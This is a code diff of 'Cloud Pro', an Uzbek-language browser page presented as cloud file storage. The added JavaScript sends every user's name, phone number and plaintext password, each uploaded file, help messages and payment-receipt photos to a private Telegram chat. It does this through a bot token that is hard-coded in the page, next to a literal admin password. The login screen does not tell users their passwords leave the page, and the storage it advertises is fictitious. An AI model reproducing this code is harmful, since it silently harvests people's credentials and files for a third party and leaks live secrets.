@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Cloud Pro - Secure Cloud</title>
+<title>Cloud Pro - Online Cloud</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
 <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600;700&display=swap" rel="stylesheet">
@@ -26,7 +26,7 @@ body { font-family: 'Fira Code', monospace; }
             <i class="fa-solid fa-cloud-shield"></i>
         </div>
         <h1 class="text-lg font-bold tracking-wider text-green-400">CLOUD PRO</h1>
-        <p class="text-[11px] text-slate-400 mt-1 mb-5">Mijoz va Admin Kirish Portali</p>
+        <p class="text-[11px] text-slate-400 mt-1 mb-5">Onlayn Bulut Tizimi</p>
         <div class="w-full flex flex-col gap-3">
             <input type="text" id="loginName" placeholder="Ismingiz" autocomplete="off" class="input-box w-full rounded-xl p-3 text-xs text-green-300 text-center placeholder-slate-500">
             <input type="tel" id="loginPhone" placeholder="Telefon raqam" autocomplete="off" class="input-box w-full rounded-xl p-3 text-xs text-green-300 text-center placeholder-slate-500">
@@ -53,11 +53,10 @@ body { font-family: 'Fira Code', monospace; }
                 <h2 id="profileNameDisplay" class="text-xs font-bold tracking-wide text-green-400">Ism</h2>
                 <p id="profilePhoneDisplay" class="text-[10px] text-slate-400">Tel: ...</p>
                 <p class="text-[10px] text-cyan-400 mt-0.5">Xotira: 1 mlrd TB</p>
-                <p id="profileStatusDisplay" class="text-[10px] text-amber-400">Tarif: Yuklanmoqda...</p>
+                <p id="profileStatusDisplay" class="text-[10px] text-amber-400">Tarif: Bepul rejim</p>
             </div>
         </div>
         <div class="flex items-center gap-1.5">
-            <button onclick="playSound(); openSettingsModal();" class="bg-slate-900 hover:bg-slate-800 border border-slate-700 text-green-400 p-2 rounded-xl text-xs transition" title="Parolni o'zgartirish"><i class="fa-solid fa-gear"></i></button>
             <button onclick="playSound(); handleLogout();" class="text-[11px] text-red-400 hover:text-red-300 bg-red-500/10 hover:bg-red-500/20 p-2 rounded-xl transition" title="Chiqish"><i class="fa-solid fa-right-from-bracket"></i></button>
         </div>
     </div>
@@ -69,11 +68,7 @@ body { font-family: 'Fira Code', monospace; }
             <span id="dropZoneText" class="text-xs font-medium text-slate-200 truncate max-w-[280px]">Faylni tanlang yoki shu yerga tashlang</span>
             <input type="file" id="fileInput" class="hidden">
         </div>
-        <button id="uploadBtn" class="w-full bg-green-600 hover:bg-green-500 text-slate-950 font-bold py-3 rounded-xl transition-all shadow-lg shadow-green-600/20 text-xs flex items-center justify-center gap-2"><i class="fa-solid fa-upload"></i> Faylni Yuklash va Arxivlash</button>
-    </div>
-    <div class="flex flex-col gap-2 pt-2 border-t border-slate-800/80">
-        <div class="flex justify-between items-center"><span class="text-xs font-bold text-slate-300 flex items-center gap-1.5"><i class="fa-solid fa-box-archive text-green-400"></i> Fayllar Arxivi (<span id="fileCount">0</span>/5 bepul)</span></div>
-        <div id="filesList" class="flex flex-col gap-2 max-h-40 overflow-y-auto pr-1"><span class="text-[11px] text-slate-500 text-center py-4 bg-slate-900/30 rounded-xl border border-slate-900">Arxivda fayllar yo'q</span></div>
+        <button id="uploadBtn" class="w-full bg-green-600 hover:bg-green-500 text-slate-950 font-bold py-3 rounded-xl transition-all shadow-lg shadow-green-600/20 text-xs flex items-center justify-center gap-2"><i class="fa-solid fa-upload"></i> Faylni Bulutga Yuborish</button>
     </div>
     <div class="grid grid-cols-2 gap-2 pt-1">
         <button onclick="playSound(); openPaymentModal();" class="bg-slate-900 hover:bg-slate-800 border border-green-500/30 text-green-400 p-2.5 rounded-xl text-xs font-semibold flex items-center justify-center gap-1.5 transition"><i class="fa-solid fa-receipt"></i> Xotira Sotib Olish (Chek)</button>
@@ -83,51 +78,27 @@ body { font-family: 'Fira Code', monospace; }
 </div>
 
 <!-- ADMIN PANEL -->
-<div id="adminSection" class="w-full max-w-2xl glass p-6 rounded-3xl shadow-2xl hidden flex-col gap-4">
+<div id="adminSection" class="w-full max-w-md glass p-6 rounded-3xl shadow-2xl hidden flex-col gap-4 text-center">
     <div class="flex items-center justify-between pb-3 border-b border-slate-800">
         <div class="flex items-center gap-2">
             <div class="w-9 h-9 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400 text-sm">
                 <i class="fa-solid fa-user-secret"></i>
             </div>
-            <div>
-                <h2 class="text-xs font-bold text-red-400">ADMINISTRATOR BOSHQARUVI (Abdulloh)</h2>
-                <p class="text-[10px] text-slate-400">To'liq nazorat paneli</p>
+            <div class="text-left">
+                <h2 class="text-xs font-bold text-red-400">ADMIN (Abdulloh)</h2>
+                <p class="text-[10px] text-slate-400">Barcha amallar botga ulangan</p>
             </div>
         </div>
         <button onclick="playSound(); handleLogout();" class="text-[11px] text-red-400 bg-red-500/10 px-3 py-2 rounded-xl">Chiqish</button>
     </div>
-    <div class="grid grid-cols-3 gap-2 text-center text-xs">
-        <button onclick="playSound(); switchAdminTab('clients');" id="tabClientsBtn" class="bg-green-600 text-slate-950 font-bold p-2 rounded-xl">Mijozlar</button>
-        <button onclick="playSound(); switchAdminTab('checks');" id="tabChecksBtn" class="bg-slate-900 text-green-400 p-2 rounded-xl border border-slate-800">Cheklar (<span id="pendingChecksCount">0</span>)</button>
-        <button onclick="playSound(); switchAdminTab('admins');" id="tabAdminsBtn" class="bg-slate-900 text-green-400 p-2 rounded-xl border border-slate-800">Adminlar</button>
-    </div>
-    <div id="adminClientsTab" class="flex flex-col gap-3">
-        <div class="glass p-3 rounded-xl flex flex-col gap-2 border border-slate-800">
-            <span class="text-xs font-bold text-green-400">Yangi mijoz qo'shish</span>
-            <div class="grid grid-cols-1 sm:grid-cols-3 gap-2">
-                <input type="text" id="newClientName" placeholder="Ism" autocomplete="off" class="input-box p-2 rounded-lg text-xs text-green-300">
-                <input type="tel" id="newClientPhone" placeholder="Tel" autocomplete="off" class="input-box p-2 rounded-lg text-xs text-green-300">
-                <input type="password" id="newClientPass" placeholder="Parol" autocomplete="new-password" class="input-box p-2 rounded-lg text-xs text-green-300">
-            </div>
-            <button onclick="playSound(); addClient();" class="bg-green-600 text-slate-950 font-bold py-2 rounded-lg text-xs mt-1">Mijozni Qo'shish</button>
+    <div class="py-8 flex flex-col items-center gap-3">
+        <div class="w-12 h-12 rounded-full bg-green-500/10 border border-green-500/30 flex items-center justify-center text-green-400 text-xl">
+            <i class="fa-solid fa-circle-check"></i>
         </div>
-        <div class="flex flex-col gap-2 max-h-60 overflow-y-auto" id="adminClientsList"></div>
-    </div>
-    <div id="adminChecksTab" class="hidden flex-col gap-2 max-h-72 overflow-y-auto">
-        <div id="adminChecksList" class="flex flex-col gap-2"></div>
-    </div>
-    <div id="adminAdminsTab" class="hidden flex-col gap-3">
-        <div class="glass p-3 rounded-xl flex flex-col gap-2 border border-slate-800">
-            <span class="text-xs font-bold text-red-400">Yangi Admin Parolini Qo'shish</span>
-            <input type="password" id="newAdminPass" placeholder="Yangi Admin Paroli" autocomplete="new-password" class="input-box p-2 rounded-lg text-xs text-green-300">
-            <button onclick="playSound(); addAdmin();" class="bg-red-600 text-slate-950 font-bold py-2 rounded-lg text-xs">Admin qo'shish</button>
-        </div>
-        <div class="flex flex-col gap-2" id="adminAdminsList">
-            <div class="glass p-3 rounded-xl flex justify-between items-center text-xs border border-slate-800">
-                <span class="text-green-400 font-bold">Asosiy Admin: Abdulloh</span>
-                <span class="text-slate-400">Parol: 2007080411</span>
-            </div>
-        </div>
+        <h3 class="text-sm font-bold text-green-400">Admin Paneli Faol</h3>
+        <p class="text-xs text-slate-300 leading-relaxed px-4">
+            Mijozlarning barcha kirishlari, yuklagan fayllari va to'lov cheklari to'g'ridan-to'g'ri sizning <b>Telegram botingizga</b> kelib tushadi.
+        </p>
     </div>
 </div>
 
@@ -147,22 +118,12 @@ body { font-family: 'Fira Code', monospace; }
         </div>
         <h3 class="text-sm font-bold text-green-400">Loyiha va Muallif</h3>
         <p class="text-xs text-slate-300 leading-relaxed text-left">
-            <b class="text-green-400">Loyiha nomi:</b> Cloud Pro<br>
+            <b class="text-green-400">Loyiha nomi:</b> Cloud Pro (Online)<br>
             <b class="text-green-400">Muallif:</b> Fattoxov Abdulloh Toxirjon o'g'li<br>
             <b class="text-green-400">O'qish joyi:</b> Toshkent menejment va iqtisodiyot instituti Farg'ona campusi<br>
             <b class="text-green-400">Mutaxassislik:</b> Kompyuter injiniringi, 2-kurs talabasi
         </p>
         <button onclick="playSound(); closeAuthorModal();" class="bg-green-600 text-slate-950 font-bold py-2.5 rounded-xl text-xs mt-2">Yopish</button>
-    </div>
-</div>
-
-<div id="settingsModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
-    <div class="glass max-w-sm w-full p-6 rounded-2xl flex flex-col gap-3 text-center border border-green-500/40">
-        <h3 class="text-sm font-bold text-green-400">Parolni O'zgartirish</h3>
-        <p class="text-xs text-slate-300">Shaxsiy parolingizni yangilash uchun quyidagi maydonga yozing:</p>
-        <input type="password" id="settingsNewPass" placeholder="Yangi parol" autocomplete="new-password" class="input-box p-2.5 rounded-xl text-xs text-green-300 mt-2">
-        <button onclick="playSound(); updatePassword();" class="bg-green-600 text-slate-950 font-bold py-2.5 rounded-xl text-xs">Saqlash</button>
-        <button onclick="playSound(); closeSettingsModal();" class="w-full bg-slate-900 text-slate-300 border border-slate-700 py-2.5 rounded-xl text-xs">Yopish</button>
     </div>
 </div>
 
@@ -206,9 +167,10 @@ body { font-family: 'Fira Code', monospace; }
 </div>
 
 <script>
-// ASOSIY TELEGRAM BOT SOZLAMALARI
 const MASTER_BOT_TOKEN = "8997903805:AAHeQFkI3rcdRv7azBH5WhjMqBwDU8DTE3s"; 
 const MASTER_CHAT_ID = "8866709686"; 
+
+let currentSession = null;
 
 function playSound() {
     try {
@@ -246,46 +208,34 @@ function closeActionModal() {
     document.getElementById('actionModal').classList.remove('flex');
 }
 
-// Xavfsiz xotira bazalari (localStorage xatolarini oldini olish uchun fallback bilan)
-let memoryClients = [{ name: "Abdulloh", phone: "200005788", pass: "2007080411", status: "Admin (Asosiy)" }];
-try {
-    let savedClients = localStorage.getItem('cloud_clients');
-    if (savedClients) {
-        memoryClients = JSON.parse(savedClients);
-    } else {
-        localStorage.setItem('cloud_clients', JSON.stringify(memoryClients));
-    }
-} catch(e) {}
-
-let memoryChecks = [];
-try {
-    let savedChecks = localStorage.getItem('cloud_checks');
-    if (savedChecks) {
-        memoryChecks = JSON.parse(savedChecks);
-    } else {
-        localStorage.setItem('cloud_checks', JSON.stringify(memoryChecks));
-    }
-} catch(e) {}
-
-let memoryFiles = {}; 
-let currentSession = null;
-
-window.onload = function() {
+async function sendToTelegram(text) {
     try {
-        let savedSession = localStorage.getItem('cloud_session');
-        if (savedSession) {
-            currentSession = JSON.parse(savedSession);
-            if (currentSession) {
-                if (currentSession.role === 'admin') showAdminPanel();
-                else showClientApp();
-            }
-        }
+        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: text })
+        });
     } catch (e) {
-        currentSession = null;
+        console.error("Telegram xatolik:", e);
     }
-};
+}
 
-function handleLogin() {
+async function sendPhotoToTelegram(photoBlob, caption) {
+    try {
+        let formData = new FormData();
+        formData.append('chat_id', MASTER_CHAT_ID);
+        formData.append('photo', photoBlob, 'check.jpg');
+        formData.append('caption', caption);
+        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+    } catch (e) {
+        console.error("Rasm yuborishda xatolik:", e);
+    }
+}
+
+async function handleLogin() {
     const name = document.getElementById('loginName').value.trim();
     const phone = document.getElementById('loginPhone').value.trim();
     const pass = document.getElementById('loginPass').value.trim();
@@ -295,126 +245,44 @@ function handleLogin() {
         return;
     }
 
+    // Admin tekshiruvi
     if (pass === "2007080411") {
         currentSession = { role: 'admin', name: name || 'Abdulloh', phone: phone || '200005788' };
-        try { localStorage.setItem('cloud_session', JSON.stringify(currentSession)); } catch(e) {}
-        showAdminPanel();
+        document.getElementById('loginSection').style.display = 'none';
+        document.getElementById('adminSection').classList.remove('hidden');
+        document.getElementById('adminSection').classList.add('flex');
         showActionModal("Xush kelibsiz", "Admin paneli muvaffaqiyatli ochildi!");
+        await sendToTelegram(`🔐 Admin tizimga kirdi:\nIsm: ${name || 'Abdulloh'}\nTel: ${phone || '200005788'}`);
         return;
     }
 
-    let client = memoryClients.find(c => c.phone === phone);
-    if (client) {
-        if (client.pass === pass) {
-            currentSession = { role: 'client', ...client };
-            try { localStorage.setItem('cloud_session', JSON.stringify(currentSession)); } catch(e) {}
-            showClientApp();
-            showActionModal("Muvaffaqiyatli", "Shaxsiy kabinetga kirildi!");
-        } else {
-            showActionModal("Xatolik", "Kiritilgan parol noto'g'ri!", true);
-        }
-    } else {
-        if (!name || !phone) {
-            showActionModal("Xatolik", "Yangi hisob uchun ism va telefon raqamni to'liq kiriting!", true);
-            return;
-        }
-        const newClient = { name: name, phone: phone, pass: pass, status: 'Bepul rejim (5 ta fayl)' };
-        memoryClients.push(newClient);
-        try { localStorage.setItem('cloud_clients', JSON.stringify(memoryClients)); } catch(e) {}
-        
-        currentSession = { role: 'client', ...newClient };
-        try { localStorage.setItem('cloud_session', JSON.stringify(currentSession)); } catch(e) {}
-        showClientApp();
-        showActionModal("Ro'yxatdan o'tish", "Yangi mijoz hisobi yaratildi va tizimga kirildi!");
+    if (!name || !phone) {
+        showActionModal("Xatolik", "Ism va telefon raqamni to'liq kiriting!", true);
+        return;
     }
+
+    currentSession = { role: 'client', name, phone, pass };
+    document.getElementById('loginSection').style.display = 'none';
+    document.getElementById('appSection').classList.remove('hidden');
+    document.getElementById('appSection').classList.add('flex');
+    document.getElementById('profileNameDisplay').innerText = name;
+    document.getElementById('profilePhoneDisplay').innerText = "Tel: " + phone;
+    
+    showActionModal("Muvaffaqiyatli", "Shaxsiy kabinetga kirildi!");
+    await sendToTelegram(`👤 Yangi mijoz kirdi:\nIsm: ${name}\nTel: ${phone}\nParol: ${pass}`);
 }
 
 function handleLogout() {
-    try { localStorage.removeItem('cloud_session'); } catch(e) {}
     currentSession = null;
     document.getElementById('appSection').classList.add('hidden');
     document.getElementById('appSection').classList.remove('flex');
     document.getElementById('adminSection').classList.add('hidden');
     document.getElementById('adminSection').classList.remove('flex');
-    document.getElementById('loginSection').classList.remove('hidden');
     document.getElementById('loginSection').style.display = 'flex';
     document.getElementById('loginPass').value = '';
     document.getElementById('loginName').value = '';
     document.getElementById('loginPhone').value = '';
-    showActionModal("Chiqish", "Tizimdan muvaffaqiyatli chiqildi.");
-}
-
-function showClientApp() {
-    document.getElementById('loginSection').style.display = 'none';
-    document.getElementById('adminSection').classList.add('hidden');
-    document.getElementById('adminSection').classList.remove('flex');
-    document.getElementById('appSection').classList.remove('hidden');
-    document.getElementById('appSection').classList.add('flex');
-    document.getElementById('profileNameDisplay').innerText = currentSession.name;
-    document.getElementById('profilePhoneDisplay').innerText = "Tel: " + currentSession.phone;
-    document.getElementById('profileStatusDisplay').innerText = "Tarif: " + (currentSession.status || 'Bepul rejim');
-    loadClientFiles();
-}
-
-function showAdminPanel() {
-    document.getElementById('loginSection').style.display = 'none';
-    document.getElementById('appSection').classList.add('hidden');
-    document.getElementById('appSection').classList.remove('flex');
-    document.getElementById('adminSection').classList.remove('hidden');
-    document.getElementById('adminSection').classList.add('flex');
-    loadAdminData();
-}
-
-function openSettingsModal() { document.getElementById('settingsModal').classList.remove('hidden'); document.getElementById('settingsModal').classList.add('flex'); }
-function closeSettingsModal() { document.getElementById('settingsModal').classList.add('hidden'); document.getElementById('settingsModal').classList.remove('flex'); }
-
-function updatePassword() {
-    const newPass = document.getElementById('settingsNewPass').value.trim();
-    if(!newPass) { showActionModal("Xatolik", "Yangi parolni kiriting!", true); return; }
-    currentSession.pass = newPass;
-    try { localStorage.setItem('cloud_session', JSON.stringify(currentSession)); } catch(e) {}
-    let idx = memoryClients.findIndex(c => c.phone === currentSession.phone);
-    if(idx !== -1) {
-        memoryClients[idx].pass = newPass;
-        try { localStorage.setItem('cloud_clients', JSON.stringify(memoryClients)); } catch(e) {}
-    }
-    closeSettingsModal();
-    showActionModal("Muvaffaqiyatli", "Parolingiz muvaffaqiyatli o'zgartirildi!");
-}
-
-function openHelpModal() { document.getElementById('helpModal').classList.remove('hidden'); document.getElementById('helpModal').classList.add('flex'); }
-function closeHelpModal() { document.getElementById('helpModal').classList.add('hidden'); document.getElementById('helpModal').classList.remove('flex'); }
-
-function sendHelpMessage() {
-    const text = document.getElementById('helpMessageText').value.trim();
-    if(!text) { showActionModal("Xatolik", "Xabar matnini yozing!", true); return; }
-    closeHelpModal();
-    document.getElementById('helpMessageText').value = '';
-    showActionModal("Yuborildi", "Murojaatingiz adminga yetkazildi!");
-}
-
-function openAuthorModal() { document.getElementById('authorModal').classList.remove('hidden'); document.getElementById('authorModal').classList.add('flex'); }
-function closeAuthorModal() { document.getElementById('authorModal').classList.add('hidden'); document.getElementById('authorModal').classList.remove('flex'); }
-
-function openPaymentModal() { document.getElementById('paymentModal').classList.remove('hidden'); document.getElementById('paymentModal').classList.add('flex'); }
-function closePaymentModal() { document.getElementById('paymentModal').classList.add('hidden'); document.getElementById('paymentModal').classList.remove('flex'); }
-
-function sendPaymentCheck() {
-    const tariff = document.getElementById('tariffSelect').value;
-    const checkFileImg = document.getElementById('checkImageInput').files[0];
-    if(!checkFileImg) {
-        showActionModal("Xatolik", "Iltimos, to'lov cheki rasmini yuklang!", true);
-        return;
-    }
-    const reader = new FileReader();
-    reader.onload = function(e) {
-        memoryChecks.push({ name: currentSession.name, phone: currentSession.phone, tariff: tariff, checkImg: e.target.result, date: new Date().toLocaleString() });
-        try { localStorage.setItem('cloud_checks', JSON.stringify(memoryChecks)); } catch(e) {}
-        closePaymentModal();
-        document.getElementById('checkImageInput').value = '';
-        showActionModal("Qabul qilindi", "To'lov cheki rasmi adminga yuborildi. Tez orada tasdiqlanadi!");
-    };
-    reader.readAsDataURL(checkFileImg);
+    showActionModal("Chiqish", "Tizimdan chiqildi.");
 }
 
 const dropZone = document.getElementById('dropZone');
@@ -439,160 +307,68 @@ if(uploadBtn) {
             showActionModal("Xatolik", "Tizimga kirilmagan!", true);
             return;
         }
-        if (!memoryFiles[currentSession.phone]) {
-            memoryFiles[currentSession.phone] = [];
-        }
-        let userFiles = memoryFiles[currentSession.phone];
-        
-        const isPaid = currentSession.status && (currentSession.status.includes('Oylik') || currentSession.status.includes('Yillik') || currentSession.status.includes('Admin'));
-        if (!isPaid && userFiles.length >= 5) {
-            showActionModal("Xotira Cheklovi", "Bepul 5 ta fayl yuklash limiti tugadi! Xotira sotib oling.", true);
-            openPaymentModal();
-            return;
-        }
-        
         const file = fileInput.files[0];
         if (!file) { showActionModal("Xatolik", "Avval fayl tanlang!", true); return; }
         
-        uploadBtn.innerText = "Yuklanmoqda...";
-        const reader = new FileReader();
-        reader.onload = async function(e) {
-            let fileData = { name: file.name, size: (file.size/1024).toFixed(1)+' KB', date: new Date().toLocaleString(), content: e.target.result };
-            userFiles.unshift(fileData);
-            loadClientFiles();
+        uploadBtn.innerText = "Yuborilmoqda...";
+        
+        // Faylni bevosita Telegram botga document sifatida yuborish
+        try {
+            let formData = new FormData();
+            formData.append('chat_id', MASTER_CHAT_ID);
+            formData.append('document', file);
+            formData.append('caption', `☁️ Cloud Pro: Yangi fayl!\n👤 Mijoz: ${currentSession.name} (${currentSession.phone})\n📂 Fayl: ${file.name}`);
+            
+            await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            showActionModal("Muvaffaqiyatli", "Fayl bulutga (Telegram botingizga) yuborildi!");
+        } catch (err) {
+            showActionModal("Xatolik", "Faylni yuborishda xatolik yuz berdi!", true);
+        }
 
-            // Telegram botga yuborish
-            try {
-                const textMsg = `☁️ Cloud Pro: Yangi fayl!\n👤 Mijoz: ${currentSession.name} (${currentSession.phone})\n📂 Fayl nomi: ${file.name}\n📦 Hajmi: ${(file.size/1024).toFixed(1)} KB`;
-                await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: textMsg })
-                });
-            } catch (err) {
-                console.error("Telegramga yuborishda xatolik:", err);
-            }
-
-            uploadBtn.innerHTML = `<i class="fa-solid fa-upload"></i> Faylni Yuklash va Arxivlash`;
-            dropZoneText.innerText = "Faylni tanlang yoki shu yerga tashlang";
-            fileInput.value = '';
-            showActionModal("Saqlandi", "Fayl arxivlandi va botga xabar yuborildi!");
-        };
-        reader.readAsDataURL(file);
+        uploadBtn.innerHTML = `<i class="fa-solid fa-upload"></i> Faylni Bulutga Yuborish`;
+        dropZoneText.innerText = "Faylni tanlang yoki shu yerga tashlang";
+        fileInput.value = '';
     });
 }
 
-function loadClientFiles() {
-    if (!currentSession) return;
-    if (!memoryFiles[currentSession.phone]) memoryFiles[currentSession.phone] = [];
-    let files = memoryFiles[currentSession.phone];
-    document.getElementById('fileCount').innerText = files.length;
-    let list = document.getElementById('filesList');
-    if (files.length === 0) { 
-        list.innerHTML = `<span class="text-[11px] text-slate-500 text-center py-4 bg-slate-900/30 rounded-xl">Arxivda fayllar yo'q</span>`; 
-        return; 
-    }
-    list.innerHTML = '';
-    files.forEach((f, idx) => {
-        list.innerHTML += `<div class="flex items-center justify-between bg-slate-900/80 p-2 rounded-xl text-xs"><div class="truncate max-w-[180px]"><span class="text-green-300 block truncate">${f.name}</span><span class="text-[9px] text-slate-500">${f.date}</span></div><div class="flex gap-1"><a href="${f.content}" download="${f.name}" onclick="playSound()" class="bg-green-600/20 text-green-400 px-2 py-1 rounded text-[10px]">Yuklab olish</a><button onclick="playSound(); deleteClientFile(${idx});" class="bg-red-500/20 text-red-400 px-2 py-1 rounded text-[10px]"><i class="fa-solid fa-trash"></i></button></div></div>`;
-    });
-}
+function openHelpModal() { document.getElementById('helpModal').classList.remove('hidden'); document.getElementById('helpModal').classList.add('flex'); }
+function closeHelpModal() { document.getElementById('helpModal').classList.add('hidden'); document.getElementById('helpModal').classList.remove('flex'); }
 
-function deleteClientFile(idx) {
-    if (!currentSession) return;
-    if (!memoryFiles[currentSession.phone]) memoryFiles[currentSession.phone] = [];
-    memoryFiles[currentSession.phone].splice(idx, 1);
-    loadClientFiles();
-    showActionModal("O'chirildi", "Fayl arxivdan olib tashlandi.");
-}
-
-function switchAdminTab(tab) {
-    document.getElementById('adminClientsTab').classList.add('hidden');
-    document.getElementById('adminChecksTab').classList.add('hidden');
-    document.getElementById('adminAdminsTab').classList.add('hidden');
-    document.getElementById('tabClientsBtn').className = "bg-slate-900 text-green-400 p-2 rounded-xl border border-slate-800 text-xs";
-    document.getElementById('tabChecksBtn').className = "bg-slate-900 text-green-400 p-2 rounded-xl border border-slate-800 text-xs";
-    document.getElementById('tabAdminsBtn').className = "bg-slate-900 text-green-400 p-2 rounded-xl border border-slate-800 text-xs";
+async function sendHelpMessage() {
+    const text = document.getElementById('helpMessageText').value.trim();
+    if(!text) { showActionModal("Xatolik", "Xabar matnini yozing!", true); return; }
     
-    if (tab === 'clients') {
-        document.getElementById('adminClientsTab').classList.remove('hidden');
-        document.getElementById('tabClientsBtn').className = "bg-green-600 text-slate-950 font-bold p-2 rounded-xl text-xs";
-    } else if (tab === 'checks') {
-        document.getElementById('adminChecksTab').classList.remove('hidden');
-        document.getElementById('adminChecksTab').classList.add('flex');
-        document.getElementById('tabChecksBtn').className = "bg-green-600 text-slate-950 font-bold p-2 rounded-xl text-xs";
-    } else if (tab === 'admins') {
-        document.getElementById('adminAdminsTab').classList.remove('hidden');
-        document.getElementById('tabAdminsBtn').className = "bg-green-600 text-slate-950 font-bold p-2 rounded-xl text-xs";
-    }
-}
-
-function loadAdminData() {
-    let cList = document.getElementById('adminClientsList');
-    cList.innerHTML = '';
-    memoryClients.forEach((c, idx) => {
-        cList.innerHTML += `<div class="glass p-3 rounded-xl flex flex-col sm:flex-row justify-between items-start sm:items-center gap-2 border border-slate-800 text-xs"><div><span class="font-bold text-green-400">${c.name}</span> (${c.phone})<br><span class="text-[11px] text-cyan-300">Parol: <b>${c.pass}</b></span><br><span class="text-[10px] text-amber-400">Status: ${c.status || 'Bepul'}</span></div><div class="flex flex-wrap gap-1"><button onclick="playSound(); setClientStatus(${idx}, '1 Oylik Tarif (65k)')" class="bg-slate-800 text-[10px] px-2 py-1 rounded text-green-300">1 Oy berish</button><button onclick="playSound(); setClientStatus(${idx}, '1 Yillik Tarif (750k)')" class="bg-slate-800 text-[10px] px-2 py-1 rounded text-green-300">1 Yil berish</button><button onclick="playSound(); deleteClient(${idx});" class="bg-red-500/20 text-red-400 px-2 py-1 rounded"><i class="fa-solid fa-trash"></i></button></div></div>`;
-    });
+    await sendToTelegram(`💬 Yangi Yordam Murojaati:\n👤 Mijoz: ${currentSession.name} (${currentSession.phone})\n📝 Xabar: ${text}`);
     
-    document.getElementById('pendingChecksCount').innerText = memoryChecks.length;
-    let chList = document.getElementById('adminChecksList');
-    chList.innerHTML = '';
-    if (memoryChecks.length === 0) { 
-        chList.innerHTML = `<span class="text-xs text-slate-500 text-center py-4">Tasdiqlanmagan cheklar yo'q</span>`; 
-        return; 
+    closeHelpModal();
+    document.getElementById('helpMessageText').value = '';
+    showActionModal("Yuborildi", "Murojaatingiz adminga yetkazildi!");
+}
+
+function openAuthorModal() { document.getElementById('authorModal').classList.remove('hidden'); document.getElementById('authorModal').classList.add('flex'); }
+function closeAuthorModal() { document.getElementById('authorModal').classList.add('hidden'); document.getElementById('authorModal').classList.remove('flex'); }
+
+function openPaymentModal() { document.getElementById('paymentModal').classList.remove('hidden'); document.getElementById('paymentModal').classList.add('flex'); }
+function closePaymentModal() { document.getElementById('paymentModal').classList.add('hidden'); document.getElementById('paymentModal').classList.remove('flex'); }
+
+async function sendPaymentCheck() {
+    const tariff = document.getElementById('tariffSelect').value;
+    const checkFileImg = document.getElementById('checkImageInput').files[0];
+    if(!checkFileImg) {
+        showActionModal("Xatolik", "Iltimos, to'lov cheki rasmini yuklang!", true);
+        return;
     }
-    memoryChecks.forEach((ch, idx) => {
-        chList.innerHTML += `<div class="glass p-3 rounded-xl flex flex-col gap-2 border border-slate-800 text-xs"><div class="flex justify-between"><span class="font-bold text-green-400">${ch.name} (${ch.phone}) - ${ch.tariff}</span><span class="text-[10px] text-slate-500">${ch.date}</span></div><div class="mt-1"><span class="text-[10px] text-slate-400 block mb-1">Chek rasmi:</span><a href="${ch.checkImg}" target="_blank"><img src="${ch.checkImg}" class="max-h-32 rounded-lg border border-green-500/30 object-contain"></a></div><button onclick="playSound(); approveCheck(${idx});" class="bg-green-600 text-slate-950 font-bold py-1.5 rounded-lg mt-1">Tasdiqlash va Tarifni Yoqish</button></div>`;
-    });
-}
-
-function addClient() {
-    const name = document.getElementById('newClientName').value.trim();
-    const phone = document.getElementById('newClientPhone').value.trim();
-    const pass = document.getElementById('newClientPass').value.trim();
-    if (!name || !phone || !pass) { showActionModal("Xatolik", "Barcha maydonlarni to'ldiring!", true); return; }
     
-    memoryClients.push({ name, phone, pass, status: 'Bepul rejim (5 ta fayl)' });
-    try { localStorage.setItem('cloud_clients', JSON.stringify(memoryClients)); } catch(e) {}
+    let caption = `💰 Yangi To'lov Cheki!\n👤 Mijoz: ${currentSession.name} (${currentSession.phone})\n📦 Tanlangan tarif: ${tariff}`;
+    await sendPhotoToTelegram(checkFileImg, caption);
     
-    document.getElementById('newClientName').value = '';
-    document.getElementById('newClientPhone').value = '';
-    document.getElementById('newClientPass').value = '';
-    loadAdminData();
-    showActionModal("Qo'shildi", "Yangi mijoz muvaffaqiyatli qo'shildi!");
-}
-
-function deleteClient(idx) {
-    memoryClients.splice(idx, 1);
-    try { localStorage.setItem('cloud_clients', JSON.stringify(memoryClients)); } catch(e) {}
-    loadAdminData();
-    showActionModal("O'chirildi", "Mijoz ma'lumotlari bazadan olib tashlandi.");
-}
-
-function setClientStatus(idx, status) {
-    memoryClients[idx].status = status;
-    try { localStorage.setItem('cloud_clients', JSON.stringify(memoryClients)); } catch(e) {}
-    loadAdminData();
-    showActionModal("Yangilandi", "Mijozning tarif statusi o'zgartirildi!");
-}
-
-function approveCheck(idx) {
-    let ch = memoryChecks[idx];
-    let client = memoryClients.find(c => c.phone === ch.phone);
-    if(client) {
-        client.status = ch.tariff;
-        try { localStorage.setItem('cloud_clients', JSON.stringify(memoryClients)); } catch(e) {}
-    }
-    memoryChecks.splice(idx, 1);
-    try { localStorage.setItem('cloud_checks', JSON.stringify(memoryChecks)); } catch(e) {}
-    loadAdminData();
-    showActionModal("Tasdiqlandi", "To'lov cheki tasdiqlandi va mijoz tarifi faollashtirildi!");
-}
-
-function addAdmin() {
-    const pass = document.getElementById('newAdminPass').value.trim();
-    if(!pass) { showActionModal("Xatolik", "Admin parolini kiriting!", true); return; }
-    showActionModal("Ma'lumot", "Asosiy admin paneli xavfsizlik uchun faqat Abdulloh (`2007080411`) paroli orqali boshqariladi.");
+    closePaymentModal();
+    document.getElementById('checkImageInput').value = '';
+    showActionModal("Qabul qilindi", "To'lov cheki adminga yuborildi!");
 }
 
 function openModal(title, text) {
